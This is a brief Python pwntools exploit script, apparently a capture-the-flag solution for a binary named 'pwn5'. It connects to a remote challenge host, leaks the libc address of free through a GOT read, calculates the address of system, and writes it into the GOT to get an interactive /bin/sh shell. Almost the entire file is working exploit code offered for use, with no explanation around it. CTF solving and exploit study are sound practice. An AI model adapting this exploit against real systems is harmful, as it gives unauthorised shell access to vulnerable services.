from pwn import *
context.log_level = 'debug'

#cn = process('pwn5')
cn = remote('128.199.220.74',10004)
#cn = remote('ctf.cnss.studio',5005)
pwn5 = ELF('pwn5')
libc = ELF('libc.so.6_pwn5')
#libc = ELF('/lib32/libc.so.6')
print libc.symbols['system']- libc.symbols['free']
print cn.recv()
cn.sendline('/bin/sh\0')
print cn.recv()
cn.sendline('/bin/sh\0')
print cn.recv()
cn.sendline(str(0x0804A014))
print cn.recvuntil('read:0x')
p_free = int(cn.recv(8),16)
p_system = p_free +libc.symbols['system']- libc.symbols['free']
print cn.recv()
#p_system = p32(p_system).encode('hex')
print hex(p_system)
#p_system = int(p_system,16)


cn.sendline(str(p_system-0x100000000))
cn.interactive()

